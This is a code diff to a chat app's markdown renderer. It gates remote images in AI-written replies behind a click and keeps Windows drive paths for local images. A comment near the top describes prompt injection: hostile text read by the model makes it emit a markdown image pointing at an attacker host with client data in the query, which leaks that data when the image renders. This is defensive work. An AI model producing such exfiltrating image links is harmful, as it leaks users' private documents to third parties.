@@ -25,7 +25,7 @@ import {
   type ReactNode,
 } from "react";
 import { Check, Copy } from "lucide-react";
-import ReactMarkdown, { type Components } from "react-markdown";
+import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { API_BASE, ijToken } from "@/lib/api";
 import { DraftCard, draftFromFence } from "@/components/chat/DraftCard";
@@ -184,9 +184,89 @@ const AUDIO_EXT_RX = /\.(mp3|wav|ogg|m4a|flac|aac|opus)$/i;
  * /creative/file-by-path (media extensions only; ?token= because <img> can't
  * send an Authorization header). Video/audio extensions get real players.
  */
+/**
+ * WHERE AN IMAGE MAY LOAD FROM WITHOUT A CLICK (borrowed idea: assistant-ui's
+ * hardened markdown, v1.322.0). A reply is model-written, and the model reads
+ * web pages and documents someone else wrote: injected text can make it write
+ * `![](https://attacker/?q=<client data>)`, and rendering that `<img>` sends
+ * the request — a zero-click leak on a box that holds client documents. So an
+ * image loads by itself only from this PC (a local path, rewritten through the
+ * daemon), the daemon's own origin, or an inline `data:image`. Anything else
+ * waits for a press that names the host it would load from.
+ */
+export function isTrustedMediaUrl(src: string): boolean {
+  const raw = (src || "").trim();
+  if (!raw) return false;
+  if (/^data:image\/(png|jpe?g|gif|webp|avif|bmp);/i.test(raw)) return true;
+  if (/^([A-Za-z]:[\\/]|\/(?!\/))/.test(raw) || raw.startsWith("file://")) return true;
+  try {
+    const u = new URL(raw);
+    const base = new URL(API_BASE || "http://127.0.0.1:8787");
+    return u.origin === base.origin;
+  } catch {
+    return false;
+  }
+}
+
+function RemoteMediaGate({ src, children }: { src: string; children: ReactNode }) {
+  const [allowed, setAllowed] = useState(false);
+  if (allowed) return <>{children}</>;
+  let host = src;
+  try {
+    host = new URL(src).host || src;
+  } catch {
+    /* not a URL: show it as written */
+  }
+  return (
+    <button
+      type="button"
+      data-testid="remote-media-gate"
+      onClick={() => setAllowed(true)}
+      title={src}
+      className="my-2 inline-flex max-w-full items-center gap-2 rounded-xl border border-white/10 bg-white/[0.03] px-3 py-2 text-left text-[12px] text-zinc-300 hover:border-white/20"
+    >
+      <span className="truncate">
+        Load image from <span className="font-mono text-zinc-100">{host}</span>?
+      </span>
+    </button>
+  );
+}
+
+/**
+ * v1.322.0: react-markdown's default URL filter treats `C:` as an unsafe
+ * scheme and blanks it, so an image the pixio tools saved to a Windows path
+ * (`![out](C:\…\out.png)`) never displayed. An IMAGE source that is a
+ * drive path is kept (MarkdownMedia then routes it through the daemon's
+ * guarded media route); every other URL — and every link — still goes through
+ * the default filter.
+ */
+export function mediaUrlTransform(url: string, key: string): string {
+  // The parser percent-encodes a backslash (`C:%5CUsers…`): decode a drive
+  // path back to what the model wrote before the media component reads it.
+  if (key === "src" && /^[A-Za-z]:([\\/]|%5[Cc])/.test(url)) {
+    try {
+      return decodeURIComponent(url);
+    } catch {
+      return url;
+    }
+  }
+  return defaultUrlTransform(url);
+}
+
 function MarkdownMedia({ src, alt }: { src?: string | Blob; alt?: string }) {
   const raw = typeof src === "string" ? src : "";
   if (!raw) return null;
+  if (!isTrustedMediaUrl(raw)) {
+    return (
+      <RemoteMediaGate src={raw}>
+        <MarkdownMediaInner raw={raw} alt={alt} />
+      </RemoteMediaGate>
+    );
+  }
+  return <MarkdownMediaInner raw={raw} alt={alt} />;
+}
+
+function MarkdownMediaInner({ raw, alt }: { raw: string; alt?: string }) {
   const isLocal = /^([A-Za-z]:[\\/]|\/(?!\/))/.test(raw) || raw.startsWith("file://");
   let resolved = raw;
   if (isLocal) {
@@ -294,7 +374,7 @@ const REMARK_PLUGINS = [remarkGfm];
 
 export function Markdown({ content }: { content: string }) {
   return (
-    <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={MD_COMPONENTS}>
+    <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={MD_COMPONENTS} urlTransform={mediaUrlTransform}>
       {content}
     </ReactMarkdown>
   );
